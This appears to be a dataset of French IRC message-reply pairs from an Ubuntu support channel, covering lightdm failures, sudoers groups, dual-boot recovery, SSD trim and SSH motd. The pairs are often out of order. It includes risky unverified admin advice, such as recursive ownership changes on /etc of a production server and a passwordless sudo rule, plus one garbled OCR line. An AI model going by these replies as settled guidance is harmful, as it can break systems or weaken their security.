placement de fenêtre intelligent, on va dire :)	on peut dire que KDE est le plus complet/complexe ?
pro windows, ou juste utilisateur ne connaissant que windows ?	en complément, je cherche à mettre en place une pige pour la radio... c'est à dire un enregistrement 24/24 découpé en heure/jour pour controle du CSA. Pas besoin de qualité... 92kbit/mono
c'est pas top d'avoir 3 ou 4 bureaux installés en même temps avec chacun leur apps en doublon	je me suis jamais vraiment décidé... j'en utilise des différents sur différentes machines
je pense que la je suis sur gnome c est bien ca	tu as des screenshots sur le lien que je t'ai donné
un bureau qui ressemblerais a l utilisation de windows ca serait cool	par défaut, Ubuntu utilise Unity, qui est basé sur des applications du bureau GNOME, mais dont le "shell" (l'élément principal du bureau) est différent (le dashboard-unity)
merci a vous	prévois plusieurs heures si tu venais à interroger les présents sur le "meilleur" bureau !
desole je sais que je suis novice ici et que ca dois vous faire chier mes questions	https://doc.ubuntu-fr.org/environnements
sur mon pc ?	tu peux avoir plusieurs bureaux sous Ubuntu oui, mais le mieux est de les tester en session live, puis de choisir celui que tu préfères
ce qui veux dire en gros ?	non, tu es au bon endroit pour les questions :)
en gros : suppression de tous les répertoires	évite de balancer des commandes destructives sur le canal, c'est tout, même pour le fun
Zic... ben le jour où je serai banni, on verra	ça peut s'arranger, mais essaie de respecter les règles en attendant
je ne suis pas expert de la ligne de commande, mais elle m'apporte quelques facilités aprfois	évite, même pour blaguer, de balancer ce genre de commande ici :)
venant de windows  je vois qu il y a bcp de ligne de code tout ce passe comme cela ou pour les néophites comme moi il y a une interface graphique ?	l'interface graqhique va bien (il y en a meme plusieurs, au choix)
lol	regarde sur le net.. tu vas vite savoir
c est une HP	à vérifier...
carte sorry	le plus pénible... les winprint
lors de l'ajout de nouveaux materiels comment cela ce passent il pour les drivers	dans 98 0es cas besoin de rein
Support à long terme	suis un bouseux moi... pas un pistolero !
Long Term Support	je sais... mais je préfère....
un peu des 2 marmotte	je n'utilise que ça ou presque...
je ne sais pas si j ai bien fait mais j ai installer ubuntu 14.04	la 14.04, c'est la dernière LTS, donc à part avec un matériel très très récent (et encore, les kernels récents sont dessus maintenant), tu ne devrais pas avoir de problème
merci	oui, bienvenu ;)
bonjour a tous je suis un new utilisateur de linux	bienvenue chez les noobs
impeccable   (je suis nul sorry)	nous avons tous débuté un jour
ok je regarde	sauf erreur je croi qu'avec -o tu peux lui dire où aller s'enregistrer verifie dans le man
Quand on fait un wget  où sont téléchargés les fichiers ? je ne les retrouves pas dans le dossier "telechargement"	par défaut dans le dossier courant
je suis sous Lubuntu 15.10 x32	convert (imagemagick) doit pouvoir faire ça assez facilement
BOnsoir	ton moteur de recherche ne t'offre pas la réponse ?
il manque des dépendances	http://askubuntu.com/questions/511370/applications-can-no-longer-access-your-online-account
HDD/Diagnosis ?	je sais pas du tout mais oui ça doit etre ça
ok bon tant pis alors	bon bah si ça plante, tu referas le vrai formatage bas niveau
*conseille	les outils de formatage bas niveau c'est dans /HDD/Disk Wiping ?
les outils de formatage bas niveau c'est dans /HDD/Disk Wiping ?	non, c'est souvent une option à la fin des outils de diagnostique des constructeurs
pas besoin de windows :)	ah ok, je connaissais pas, et puis ça remontait à très longtemps mon truc
c'est quoi comme marque ?	ils sont dispo pour tous les constructeurs sur l'ubcd
parce que si ça plante ça va définitivement tuer le disque je pense	moi j'ai fait ça sur windows avec un soft qui appartient au fabricant du disque que j'ai trouvé sur son site
ok	et puis, le formatage bas niveau c'est très très long
@alt dreamweaver	Error: Impossible de trouver un ou des equivalent(s) pour ce logiciel, logiciel introuvable.
je pense qu'il va tenir. Je vais pas faire tourner GTA 5 en ultra là dessus. :)	je te conseil quand mm d'investir dans ces petits dissipateur
Bon bah j'ai le temps ;)	tu as bien les petits radiateurs de posé sur les puces ?
Deuxième question, quelle est la durée de vie d'un raspberry pi 2, overclocké normalement	oula ... a mon avis ca tiendra plus longtemps que ma grand mere
agrandir une partition de 3 go à 6 go	le disque fait cb au total ?
J'ai une quesiton : Une opération sur gparted prend combien de temps ?	ca depend de la taille du disque
http://support.amd.com/fr-fr/download/desktop?os=Linux                   086_64	merci je vais tenter
bonsoir	bonsoir
Je cherche ce qui peut se passer ....	tu sais ou je pourrais trouver des logs ?
Unity est un dérivé de gnome-Shell	ha ok
Quel WM ?	je sais mm pas
C'est une super carte ça !	j'ai quand mm l'impression que Nvidia est mieux supporté sur linux
ca commence a me prendre le chou	tu as quelle carte graphique /pilote ?
tu as quelle carte graphique /pilote ?	alors j'ai une AMD Radeon R9 270 avec les pilotes proprio car sinon les perfs en jeux sont pas top
essaye toujours	apport pose des problemes ?
je vais mettre rootdelay=120	nettoyes ton grub
mais est-ce vraiment une bonne idee ?	pas grave il pose pas mal de problème
lut nomad_fr	quels points d'interrogations ?
remplace irqpool par all_generic_ide	je laisse clocksource=acpi_pm?
re	au fait tu as quel noyau ? uname -a
on vois bien les 4 disques mais ça marque une erreur....	c'est un asus ton pc ?
?	pas sûr mais cela doit aider : http://askubuntu.com/questions/642008/error-0-000000-tsc-fast-tsc-calibration-failed
non je pense que ça viens carrément du bios (pourtant la pile est bonne)	normalement tu dois avoir le ntpd qui se charge de te garder à l'heure
bonjour, je voudrais savoir où sont stocké les messages d'erreur sur ubuntu	/var/log
Firefox version 42.0	essaye de demander sur #firefox peut-être qu'ils auront une idée
Je vais m'essayer Arch sous VirtualBox pour voir	pourquoi rester sur unity ? y a plein d'autres façons
Est-ce que, à votre connaissance, Unity a été portée sur d'autres distrib' que Ubuntu ?	apparemment c'est dispo sur Arch (et SuSe et Fedora ont arrêté de le supporter à cause de certains patch de GTK)
Okay, alors je vais attendre qu'elle ait fini ... au cas où cela ne marche pas	en fait c'était le dépôt Steam qui posait problème, les mises à jour sont du coup en train de se faire
mais c'est l'ajout dans la barre de tâche qui coince	dans le desktop :  Exec=pcmanfm tonRépertoire
au fait il y a un tuto mais pour les appli binaires du type lancer firefox, libreoffice etc. mais pas pour le non binaire.	il te faut déjà créer un fichier desktop avec le gestionnaire de fichier (ex nautilus) et en paramêtre le nom de ton répertoire
il s'agit d'ajouter un bouton (qui ouvre un dossier particulier) dans la barre des tâches. le bureau étant le LXDE	avec quel gestionaire de fichier nautilus ?
j'ai une question concerant Lubuntu, je ne sias pas si je peux la poser ici, merci	essayes toujours
sinon y a pas moyen de forcer l'installation ?	ce que je comprends c'est que apt voudrait installer le paquet libsqlite3-0 dans sa version 3.8.2-1ubuntu2 mais tu as la version 3.8.2-1ubuntu2.1 d'installé. Il s'avère que sur ma trusty c'est comme toi sauf que apt s'en cogne chez moi.
je vais tester ça si personne répond sur #ubuntu	sinon tu peux poster la sortie de apt-config dump que je compare avec ma trusty ?
bah t'as une différence entre ubuntu2 et ubuntu2.1	tu peux paster (sur le web) le résultat complet de « LC_ALL=C apt-get install sqlite3 -s » ?
Exagone313 : Oui mais n'y a t'il pas moyen de changer celui par féfaut qui est Ubuntu ?	ça dépend du session manager. normalement avec celuio par défaut d'ubuntu, ça laisse le dernier choisi dans la liste
j'ajoute que c'est dans docker	c'est curieux ton souci, toutes les dépendances sont installées mais il veut pas installer le paquet...
Est ce que quelqu'un serai comment changer l'environnement bureau par défaut ? Merci	tu le lances à la connexion
Bonjour, j'essaye d'installer le paquet sqlite3 sur ubuntu 14.04, sauf que j'ai cette erreur: sqlite3 : Depends: libsqlite3-0 (= 3.8.2-1ubuntu2) but 3.8.2-1ubuntu2.1 is to be installed. Que faire ? Merci pour votre aide.	et si tu tentes une « apt-get install libsqlite3-0 », ça dit quoi ?
aucune idée :p	en tout cas merci ;)
--> No. Part of full disk encryption, Truecrypt or otherwise, is writing random data to the hard drive.	hum mais pour le coup on peut mettre le bordel dans ma partition système
hum mais pour le coup on peut mettre le bordel dans ma partition système	si tu chiffres pas on peut effectivement tout faire
si tu chiffres pas on peut effectivement tout faire	Peut être en regardant de ce coté http://www.johannes-bauer.com/linux/luksipc/
https://askubuntu.com/questions/96870/is-there-a-way-to-do-full-disk-encryption-after-the-install	Tu pense que je peux faire confiance à mes camarades de projet ?
pas forcement très simple a faire	en attendant j'ai utiliser Ecryptfs pour créer un dossier Private
depuis le livecd possiblement	Merci c'est bon à savoir
si oui comment s'en prémunir	tu peux mounter la partition et utiliser la commande passwd
sauf que tu as aucune chance de faire changer le paramétrage	moi tout seul non
detournement et interception correspondances privées	je suis sur que c'est précisé dans les conditions d'utilisation du service
je suis sur que c'est précisé dans les conditions d'utilisation du service	peut être mais ca reste illégal
j’ai refait 20x mes tests, je vois pas ce que j’ai pu rater mais si qqn ici est chez Bouygues et souhaite faire le test pour me confirmer ca, ce serait cool	c'est pas étonnant comme pratique sur du mobile
c'est pas étonnant comme pratique sur du mobile	ouais mais c’est totalement illégal
-_-'	l'art de résoudre les problèmes sans connaître les énoncés
et non, rien d'autre genre batterie	la doc n'est pas complète ... tu as quoi dans "Bios / advance/ Network Stack" ?
:/ c'est un cauchemar, ca fait une semaine que je suis là dessus, pas la moindre petite avancée	tant que t'es dans les tests, tu as pas une options économie d'energie dans le bios ?
pareil sur fedora 22 d'ailleurs	si tu veux essayer avec la LTS il vaut mieux essayer avec une iso récente (14.04.3) pour avoir un kernel plus récent… mais pas sur que ça change qq chose
si tu veux essayer avec la LTS il vaut mieux essayer avec une iso récente (14.04.3) pour avoir un kernel plus récent… mais pas sur que ça change qq chose	c'était bien la .3 que j'ai essayé :/
ça fait pareil avec un live d'une version plus ancienne ?	la 14.0
en désactivant Intel SCC Card Reader	ca n'a rien changé
et l'indicateur de batterie ne comprend pas quand le cable est branché / débranché	au moins t'es pas tout seul : https://forum.ubuntu-fr.org/viewtopic.php?pid=21041931
peut être que je dois mettre le bios à jour ?	si y'en a un c'est toujours bon oui
mais bon, un netbook sans carte wifi :/	juste le wakeon
déjà essayé, c'est la catastrophe sous la 14.04, touchpad non reconnu, wifi non plus, résolution en 800x600	tu devrais désactiver tous les wake up on ... lan wifi keyboard
quelqu'un aurait une idée de pourquoi un ordi ne démarre pas sur batterie (freeze pendant le boot d'ubuntu wily) alors que sur secteur oui ?	quelle version d'ubuntu ?
aucune moyen de l'avoir en définitif ?	en la rajoutant au demarrage si ;)
faut que je sort un clavier virtuel ou un clavier usb pour avoir son code n'es-ce pas ?	elle s'appelle "Delete"
merci :)	comment ça ?
(oui oui je sais que c'est "on reboot ©®" mais bon)	oui dit comme ça on dirais du M$ effectivement, :)
il y a pas un autre moyen de recuperer au moins des miettes de fichiers	tu boot ton pc sur un usblive
fin le system de fichier n'est plus valide	on peut voir l'état de tes partitions ?
spontex_  justement je voulais recuperer une partie de fichiers	tu as des I/O errors au boot sur ton disque ?
je ne m'attendais pas à une tel quantité d'info d'un coup  ...	ça va pas la tête de conseiller ça comme ça -___-
par exemple la touche 'k' chez moi a le keycode '45' et la touche ';' se nomme 'semicolon' donc si je veux rebind 'k' sur la touche ';' --> xmodmap -e "keycode 45 = semicolon"	Puis-je t'envoyé le pastbin ?
bonsoir, je suis sous Lubuntu 15.10 (sous un Macbookpro2011) j'aimerais rebinder la touche "eject" en supp/del mais je ne comprendre rien aux documentation existante, quelqu'un pour m'iadé ou me mettre sur la bonne voie ? d'avance merci bisou	moi je fais ça avec xmodmap
ah, il a fini par répondre, oops	:
ls -ld /etc/sudoers.d	drw-r--r-- 2 root root 4096 nov.  25 15:51 /etc/sudoers.d
qlq a une autre idée comment je peux le résoudre ?	?
?	total 0
j'ai beau essayer des choses .. j'ai malheureusement aucun succes	executable nautilus avec ton rep en paramètre
mais je pouvais pas	aussi, le backup, c'est un truc à faire
et il me les listait	si tu as pas créer le dossier /home/ventura/Images/grutableau tu as probablement perdu tes fichiers
le dossier	mv est une commande silencieuse
r	donc tu n'as aucun fichier en *.jpeg
J’espère que ça ne veut pas dire que ce sera permanent	generalement cela signifie que tu as des erreurs sur ton disque, tu peux vérifier la sortie de la commande "dmesg"
un peu quand même	ha ben j'ai relu il a bien trouvé le "format personalisé" en fait dans ce brouhaha je n'avais pas vu
si il revient, je lui dit, je vais réparer ma betise, 'fin si il revient	non mais c'est pas grave hein
point de réponse mine de rien	la "marque d'une imprimante" pour la fonction "imprimer dans un fichier" ? t'es sérieux ?
(ie. j'ai rien sous la main pour toi)	j'ai tester en enlevant les HDD du SAS c'est ok mais j'ai pas tester SATA + SAS
j'ai tester en enlevant les HDD du SAS c'est ok mais j'ai pas tester SATA + SAS	http://www.serialstoragewire.org/images/articles/it24fig1.jpg
http://www.serialstoragewire.org/images/articles/it24fig1.jpg	je connais. Ce que je veux dire c'est qu'il y a sur ma carte mere 1 connexion sata (utilisé par le lecteur DVD) et 1 connexion SAS (sur lequel est le controleur + 2 hDD). J'ai débranché le SAS et mis le SSD sur le SATA: fstrim ok. La question est: si je laisse le SSD sur le SATA et le branche en plus le SAS avec les 2 HDD, ca va fonctionner? Pas de risque?
ok, c'est tout en bas de la longue liste	quand tu lance 'Imprimer" tu as bien un onglet "Mise en page"
c'est une machine de bureau, le 850pro est un beau bestiaux, t'en a pour un moment avant de le péter	a part ca si je le met sur le sata du DVD et les autres HDD sur le SAS ca devrait marcher non?
14.04	tu n'arrives pas à créer un format personalisé ?
tu n'arrives pas à créer un format personalisé ?	non
pf, le site de lsi a changé, y'a plus le pdf que j'avais mis de coté	si je branche le ssd a la place du lecteur DVD sur SATA; le fstrim fontionne bien
si je branche le ssd a la place du lecteur DVD sur SATA; le fstrim fontionne bien	je pense que c'est ton contrôleur qui fait abstraction de ça
je pense que c'est ton contrôleur qui fait abstraction de ça	et donc c'est foutu? pas de solution?
J'ai rien trouvé de ce côté :(	ha si j'ai bien evince et il permet bien de fixer un format avec ces propres marges.
pourquoi t'as un contrôleur ?	c'est sur la config du pc fourni par le boulot...
c'est sur la config du pc fourni par le boulot...	le module, c'est mpt2sas ?
le module, c'est mpt2sas ?	désolé, je suis linux-addict mais linux-débutant encore :-)
t'as un raid au dessous ?	oui je crois
Bonjour, j'ai essayé d'utiliser un SSD Samsung 850 Pro sur mon Dell precision mais le trim ne fonctionne pas "ERROR : This feature is not supported for disks connected to LSI RAID HBA Cards." Y-a-t-il une astuce pour faire fonctionner fstrim a travers un controlleur SAS lsi-3008? Merci	celui-ci fourni une abstraction de ton disque au système, c'est logique que ça marchre pas comme tu veux
celui-ci fourni une abstraction de ton disque au système, c'est logique que ça marchre pas comme tu veux	apparrement pas...
c'est du gnome ?	probablement gtk, oui
Dans la boite de dialogue pour imprimer, tu as la liste des imprimantes réelles installée et la possibilité d'imprimer dans un fichier !	utilise l'onglet mise en page > Taille du papier > Taille personalisée
À une époque, cela venait de cups-pdf mais depuis 12.04 « la fonctionnalité d'impression au format PDF ou PostScript est intégrée par défaut » cf. https://doc.ubuntu-fr.org/cups-pdf	la marque de ton imprimante ?
De sorte à modifier la taille des marges ?	avec quelle appli ?
FULL AUTHENTICATION The unit files-have no [Instal11 section. They arent nothingness to be enabled using systenctl Possible Reasons for hauing this kind of units are: 1) A unit May be statica lly enabled by being white synlinked fron Reviews another unit's wants / gold requires directory 2) A unit's purpose May be to act as a helper for sone --other unites uhich requirement: has a dependency on it. 3) A unit May be started via ac	re
[01:04] (McPeter) 13484443	tapes : systemctl enable lightdm.service
À... OK que peut on faire ?	voit ce que réponds un : sudo apt-get dist-upgrade
[01:04] (McPeter) 13483882	: sudo apt-get install lightdm-gtk-greeter
Message d'erreur failled because bla bla... Comme d'habitude	fais moi un : ls -l | pastebinit
13483606	un : sudo systemctl start lightdm.service
oui j'ai renseigner les id et pass correctement. la sauvegarde se fait correctement sinon mais il ne veux pas se connecter et mes paramètres sont bons	heu je pige pas ce que viens faire ton root là dednas du coup
Toujours pareil	: sudo service lightdm restart
Oui	si oui refais un : sudo reboot
OK	c'est fait ?
The upload transfer "ftp" failed.	: "Pour des raisons de sécurité le répertoire peut n'être accessible (lecture/écriture) que par une paire utilisateur/groupe. "
Et à la fin server error	: sudo apt-get install --reinstall lightdm
Socket createdlistener failled fatal server error canot establish any listening Socket make sur an x server isnt al ready runnig	ah … on va tenter une reinstall de lightdm
13483254	?
backup-manager tourne avec un service root tu es d'accord?	déjà faudrait voir les messages d'erreur qaund tu tentes de te connecter depuis le serveur2 vers le backup
Desolé avec la correction automatique ça fait pas un lien du coup	et dis moi ce qu'il se passe
Http://paste. Ubuntu. Com/13483154	tentes depuis le terminal : startx
c'est un serveur ovh qui veut faire une sauvegarde sur leur service backup storage	si c'est le service backup storage d'ovh qui fait tourner le server ftpd, pourquoi ne contactes tu pas le support ovh ? oO
en fait machine 2 c'est plus une serveur2 qui veut faire une sauvegarde sur serveur2'	"local" pour toi ca veut dire sur le même LAN ? sans firewall entre les deux ?  et "prod" ca veut dire dans des subnets differents ? exposés au WAN ?
ça me dit ça : Name or service not known	question subsdidiaire: pourquoi utiliser ftp ?
question subsdidiaire: pourquoi utiliser ftp ?	tu as eeu mon dernier msg ?
tu as eeu mon dernier msg ?	si tu ne precises pas lequel, je ne peux pas savoir si c'etait le dernier ou pas
OK	fais l'autre commande aussi
Plus de failled mais toujours bloqué	pas grave :)
Il a installé nouveau paquet	bon déjà : Active: inactive (dead)  (on s'en doutait :p )
Je me log	retournes dans le terminal : ctrl+alt+f2
Tout les autre son OK	ok … reboot again
Au démarrage maintenant je Block sur failed to start lsb start ntp daemon	Ctrl + ALt + F2
oui avec un compte normale je peut appeler la console ftp  xx.xx.xx.xx et pas sous root	il va falloir être plus clair, disons que tu as server1 (qui fonctionne), server2 (qui ne fonctionne pas) et client1 (la machine qui te set à te connecter aux servers) … sur quelle(s) machine tourne le ftpd ?
|j'avais mis ça !  Oui Ya 2 i	mmh .. ok ..
Requiert une option d'action	reboot en cours ?
McPeter j'ai supprime la partition sda4 comme un debile :(((	je me demande si y'a pas grub qui traine encore du coup
ben appeler la commande ftp avec un serveur derrière	je ne comprends pas, le service ne tourne pas sur les servers ?
McPeter est pire qu'un ministre ce soir	sudo reboot
Même message	bon on va tenter un reboot pour voir
Enfin O	ah ! :)
Oui McPeter ca ne change rien, au demarrage j'ai un "No such partition, entering rescue mode"	tu as supprimé ton ubuntu (sda4) comment ?
Je pense que mon problème se situe sur ma constatation. ou je peut verifier si root peut lancer une console ftp	qu'est ce que tu entends par "console ftp" ?
À oui j'ai dit OK	??
McPeter : http://imgur.com/Rv9Nf33	dans la procédure de récupération de windows tu as tenté le bootrec /FixMbr ?
Je lit	si tu tapes : dpkg -l xserver-xorg-video-nouveau
Mais si il a supprimé des truc quand même	retente un : service lightdm start pour voir
Oui il a écrit plein de trucs et la phrase nvidia persistenced aucun processus trouver	lol :)
Comment je fait pour fair un lien tu pourra voir comme ça	mmh … bizarre
Le chargement n'avance pas du tout en laissant tourner 30mn alors que les 100Go sont vides :(	dans la session live si tu lances gparted il voit bien un ext4 en sda4 ?
Je crois	tu as bien tapé : sudo apt-get purge nvidia-*
Oui et quand j'essaye de reinstaller ubuntu il bloque sur l'amenagement de sda4 tout au debut	"il bloque" comment ?
Aucun processus trouve	bizarre ce message …
Arf comment je sais ?	suite à la commande que je t'ai donnée
Ma partition Windows est encore la je l'ai verifie :)	dommage que tu es viré d'entrée ubuntu .. t'as peu-être massacré le bootloader :\
OK c'est fait	ça a supprimé des paquets ? ou rien ?
OK OK	commence par un : sudo apt-get purge nvidia-*
J'ai lu ca deja McPeter et je n'ai rien pu en tirer :(	et ça : https://doc.ubuntu-fr.org/comment_recuperer_windows_apres_installation_ubuntu  ?
Qrf😑	on va déjà voir si y'a du nettoyage (nvidia) à faire
2961 0.00.0 grep-- color = auto-i nvidia	ok .. pas de nvidia qui tourne
Je suis donc actuellement sur un live usb	https://doc.ubuntu-fr.org/cohabitation_ubuntu_windows
J'ai voulu installer ubuntu 15.03 en dual boot avec w7, donc je lui ai cree une partition de 100Go et je l'ai installe dessus avec un swap de 4Go, mais je pense avoir fait une erreur dans l'installation et j'ai surement supprime des fichiers de demarrage de windows puisque depuis Windows ne demarre plus	ben déjà 15.03 ça va être dur .. ça existe pas :) tu dois vouloir dire : 15.04
Quelqu'un serait-il en mesure de m'aider a recuperer mes donnees ?	faudrait expliquer quel est exactement ton problème en fait
oui	tu as quoi comme carte graphique ?
http://paste.ubuntu.com/13482096/	tu as fait une migration de 15.04 en 15.10 ?
en rouge sur la commande d'avan	salut, peux tu faire un sudo apt-get install pastebinit
ça écrit quoi ?	lui faire utiliser pastebinit peut être ? (si il a une connexion internet active)
lui faire utiliser pastebinit peut être ? (si il a une connexion internet active)	tu peux te charger de faire sortir les logs via pastebinit ?
job for lightdm service failled because the control process exited with error code see systemctl status lightdm.service and journalctl -xe for details	si tu tapes : journalctl -xe
unity oui	que répond un : service lightdm start
enfin 'foireux' ...	sur une migration les PPA sont désacivés
un ppa foireux peut-être ?	m'étonnerais
svp	commodore
hello, quelques connaisseurs de filevault2 sur macosX ici ? (malgré le nom du channel)	c'est un salon de support ubuntu, le support firevault ou macosx, c'est ailleurs (et probablement pas sur freenode, vu que le but de freenode est d'être une plateforme irc pour les projets libres)
tu as #debianfr sous freenode	surtout qu'il y est ... (sur #debianfr )
bye	tu as ##linux-fr
c'Est pourquoi je me suis tourné vers ici	ne pas trouver ailleurs ne fait pas de #ubuntu-fr un salon généraliste, il faut se tourner soit vers un salon généraliste, soit vers un salon offtopic
j'ai le problème suivant: quand je boot ma clé usb clonezilla et sélectionne un choix (que j'ai fait) ça boot jusqu'a ce message: can't access tty job control turned off	/msg alis indique que #clonezilla sur freenode est leur salon officiel
https://wiki.ubuntu.com/Lubuntu/Meetings/20130827	t'as raison je suis sous debian
ça sent l'utilisateur Debian ;þ	j'ai fait la manip avec thunar "simplement" et ma commande perso est apparue dans nauthilus :)
au fait il sagit d un mac Book Air 128Go 64 bits	sur un MacIntel en utilisant le bon .iso, normalement tout se passe tout seul, pas besoin de toyucher manuellement à l'EFI
mouaip ... un peu brutal	gnome settings-daemon plugins settings y'a overrides (y'avait un windowsScaleFactor
gnome settings-daemon plugins settings y'a overrides (y'avait un windowsScaleFactor	ho la cochonceté que voilà !!
reperdu	tu es sur quelle version d'ubuntu ?
kwool :)	merci beaucoup
l'utilisateur tomate.	normalement c'est bon, tu as bien fait une deconnexion/reconnexion avant de tester ?
et je peux faire un sudo -i	fait voir ta config /etc/sudoers et /etc/group
fait voir ta config /etc/sudoers et /etc/group	http://paste.ubuntu.com/13476880/ fichier /etc/groups
http://paste.ubuntu.com/13476880/ fichier /etc/groups	et quel utilisateur a accès à sudo mais ne devrait pas ?
moi,  je fais un usermod  de l'utilisateur sur le group technicals.	et donc ton utilisateur fait parti du groupe c'est ça ?
et donc ton utilisateur fait parti du groupe c'est ça ?	oui, j'ai partie du groupe technical.
en plus tu supprimes le besoin d'entrer un mot de passe	cela je viens de me rendre compte d'une erreur dans mon fichier /etc/sudoers j'ai oublié le pourcentage.
mais je ne comprends pas depuis le compte toto je puisse faire un sudo -i	/etc/sudoers s'ouvre avec la commande visudo qui a l'avantage de vérifier la cohérence du fichier avant de relancer
/etc/sudoers s'ouvre avec la commande visudo qui a l'avantage de vérifier la cohérence du fichier avant de relancer	%technicals     ALL=(ALL) NOPASSWD: ALL
quand je fais un groups toto .  ils me dit toto : toto maison technicals	tu as regardé le lien ?
tu as regardé le lien ?	oui, je regarde le lien .
Il ne sont pas dans le groupe sudo . je vérifie	https://doc.ubuntu-fr.org/users-admin#changer_le_type_de_compte_d_utilisateur
https://doc.ubuntu-fr.org/users-admin#changer_le_type_de_compte_d_utilisateur	je suis en ligne de commande , je n'ai pas interface graphique.
ou alors un purge de ubuntu-desktop ?	tu as pas besoin de reinstaller vu que ça marche biebn avec un autre compte
en cas d'accessibilité par exemple	si je réinstalle en gardant mon Home, je risque de garder le même pb
Bonjour, je voudrais savoir. Comment empecher des utilisateurs  systeme d'avoir les pourvoir root avec la comment sudo -i	les supprimer du groupe "sudo"
dans tous les cas ?	y'a un raccourci "tout péter sans tout péter" ?
un pb de config quelquepart ?	tu as le soucis pour tous tes utilisateurs ?
j'y go, je re' plus tard	même probleme avec nouveau, pas de pb en LiveUSB
pourquoi faire simple quand on peut faire compliqué ;)	qu'est-ce qui est compliqué ?
bah, tu as 500 users ?	je veux désactiver ce machin qui me casse les pieds, épicétou!
"It seems it is possible to disable this message on a user basis by creating an empty file in a user's $HOME directory (/home/username/) called .hushlogin"	oui, le .hushlogin je l'avais vu mais c'est propre à un user.
sinon	merci pour le lien je crois que je tiens la solution => c'est dans /etc/update-motd.d/
merci pour le lien je crois que je tiens la solution => c'est dans /etc/update-motd.d/	il est bien écrit le lien hein :P
bon ben désolé alors. Mais je vais regarder un truc avec. Car toucher à PAM, ça me fait peur.	compare les fichiers /etc/pam.d/sshd
effectivement :)	vamps: a priori, toucher à PAM peut être évité car j'ai une autre Trusty avec la même conf pam et pourtant sur ce serveur, je n'ai pas de message.
dans le fichier sshd	il faut les commenter si j'ai bien compris "just hash out the following lines"
"disable motd ssh" :)	il y'a un probleme, ces lignes y sont déjà
J'ai comparé le sshd_config avec celui d'une Jessie où j'ai pas de message à la con, et c'est pareil.	regarde le lien (c'est le premier qui sort lors d'une recherche...)
regarde le lien (c'est le premier qui sort lors d'une recherche...)	merci.
décommente et passe à off	j'ai tenté off et no aussi mais sans effet.
http://www.ubuntu.com/support Guest49970	j'ai une option Banner dans sshd_config mais elle est déjà commentée.
Existe t il un numero de tél pour avoir une assistance Ubuntu?	essayes l'option nomodeset au lancement --> http://ubuntuforums.org/showthread.php?t=2058178&p=12243814#post12243814
ça va pas tout supprimer, mais une partie	ça enlève une seule ligne sur la dizaine restante en effet.
Je croyais que c'était un paquet du genre motd (ou un nom de le genre) mais apparemment j'ai pas de paquet comme ça installé.	dans ton sshd_config l'option PrintLastLog
bonjour! je suis embêté lors de l'installation de mon Lubuntu, quelqu'un pourrait il m'aider? :/	quel est le problème, quelles solutions ont été tentées ?
Comment puis je déverouillé ce DVD s'il vous plait ?	c'est pas autorisé par la loi de déverouiller des DVD :p
c'est pas autorisé par la loi de déverouiller des DVD :p	c'est le DVD d'un ami qui a prit des photos, cela n'a rien à avoir avec ça :)
je viens d'installer texlive	bref, fais du LaTeX et parfois, sans le savoir, tu utiliseras des commandes TeX.
Salut, est-ce que vous avez de bonnes ressources pour apprendre Tex (ou Latex) ? Je ne saisis pas très bien la différence entre les deux	LaTeX est une sorte de surcouche de TeX.
y a plein de facon, mais il faudrait commencer par pouvoir discuter directement avec une personne ayant acces physique à la machine … là on avancera à rien	quand même, la probabilité que la réponse soit dans le thread est élevée nope ?
quand même, la probabilité que la réponse soit dans le thread est élevée nope ?	on en sait rien … à moins que l'ordi ait été reformaté recemment, le probleme à plus de chance d'avoir une origine differente
et faire un contrôle avec son fstab	avant de penser que c'est une erreur de montage, si il n'y a pas une d'operation recente sur le disque qui aurait declenché le plantage, il faudrait commencer par tester le disque
bonjour	je lui ai fait lancer ssh mais elle a le meme message d'erreur
J'aimerais également savoir s'il est possible de faire une migration de lubuntu 14.04 vers ubuntu 14.04 ?	bonjour
le principale c'est deja d'avoir retabli mon sudoer et d'utiliser autre chose que ROOT: bon je vous remercie pour votre aide en tous cas MERCI	oh... de rien. :)
un groupé root et le reste en owned/grp www-data	si tu peux te permettre d'avoir le site « DOWN » pendant qq minutes, perso je tenterais un chown -R root:root puis un reboot puis une petite inspection pour voir si le site web fonctionne bien etc.
chez moi apache2 est en root	tu sais à quoi est censé servir ce serveur (les serivces qu'il est censé offir, un site web etc. ?)
tu met un shell /bin/false	ça ne résoudra pas son pb, àmha.
comment on vois les problemes qui peuvent etre lié à ce truc, avec le owned et grp utilisateur je parle	mais ce serveur, c'est toi qui l'administre ?
et en plus je sais pas quand la bourde a été faite depuis un peu de temps car il y a une belle liste de commande en mémoire sur le compte root	voilà ce que je tenterais à ta place (mais c'est vraiment sans garantie aucune, c'est toi qui vois). 1. chown -R root:root /etc/ 2. dpkg-reconfigure --all 3. reboot 4. regarder ensuite si tout semble bien fonctionner sur le serveur.
ok	tu as le droit de rebooter ton serveur ?
a l'utilisateur ?	mais je te l'accorde, la majorité des fichiers de /etc/ appartiennent à root
qui est passé en -R	oui certes mais par exemple sur une machine j'ai /etc/postgresql qui n'appartient pas à root.
au pire j'ai toujours un acces en mode rescue netboot	attention au chown -R root:root
les permissions n'ont pas changé du peu que je compare je pense que c'est que le owner et groupe	bonne nouvelle
c'est environnement serveur qui est en prod.... il va y avoir des choses que je n'aurai forcemment pas	pas de backup ?
pour le moment je confirme owner/group.	http://askubuntu.com/questions/308939/how-to-reset-default-permissions-for-etc
comment je peux comparer les permissions ?	il faudrait une autre install pour référence
je me dis faisons l'invers chown -hR root:root /etc mais je flippe un peu	si c'est juste le owner/group qui a changé spa trop grave tu peux faire un chown root:root sans trop de risque mais si les permissions ont été changées la c'est plus chaud
en gros tu veux un cgi sur curl ?	oui mais t'embête pas, c'était pour rire. Je vais me débrouiller. On est HS là. :)
et puis désolé je déteste le python	t'inquiète, je blaguais hein :) (même j'ai besoin de faire ce que j'ai dit)
Merci d'avance Exagone313 ;)	installe django-rest-framework, fait le tuto, ce que tu cherches à faire te demandera ~20 minutes de plus … sinon ce n'est pas le lieu pour demander du taf gratos, c'est un salon de support
installe django-rest-framework, fait le tuto, ce que tu cherches à faire te demandera ~20 minutes de plus … sinon ce n'est pas le lieu pour demander du taf gratos, c'est un salon de support	je plaisantais hein, je cherche pas à faire bosser qq'un gratos pour ma pomme, j'suis pas comme ça. :)
il faut voir la version du module sur ton ancienne et nouvelle version d'ubuntu	Je ne sais pas comment faire pour vérifier la version du module... J'ai essayé de regarder dans les sources, j'ai seulement trouvé
